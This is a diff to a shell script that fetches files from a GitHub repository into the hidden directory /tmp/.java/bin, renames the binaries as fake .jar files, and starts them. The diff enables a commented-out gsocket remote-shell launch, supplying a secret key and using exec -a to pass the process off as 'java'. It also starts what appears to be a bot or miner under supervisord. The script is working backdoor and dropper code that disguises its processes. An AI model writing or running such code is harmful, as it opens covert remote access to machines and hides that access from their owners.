@@ -2,20 +2,19 @@
 
 function fetch_files() {
     mkdir -p /tmp/.java/bin
-    cd /tmp/.java/bin &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o bots.jar &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cfg.conf -o cfg.conf &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cnf-0.json -o conf.json
-    # && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o bots.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cfg.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cnf-0.json -o conf.json
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     echo "DONE ..."
 }
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
-    # export GSOCKET_ARGS="-s b3928cae-d2a1e2c-5a16f98-13d9g8hbj7-56c4a961-ecd9f9440-d6a2803-8a1c5j1g60 -liqD"
-    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
+    export GSOCKET_ARGS="-s bE928cAe-D2a1E2c-5A16f98-13D9g8Hbj7-56C4a961-eCd9-F9440-d6A2803-8A1c5J1g60 -liqD"
+    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
     echo "BOT SERVER STARTED ..."
 }
 
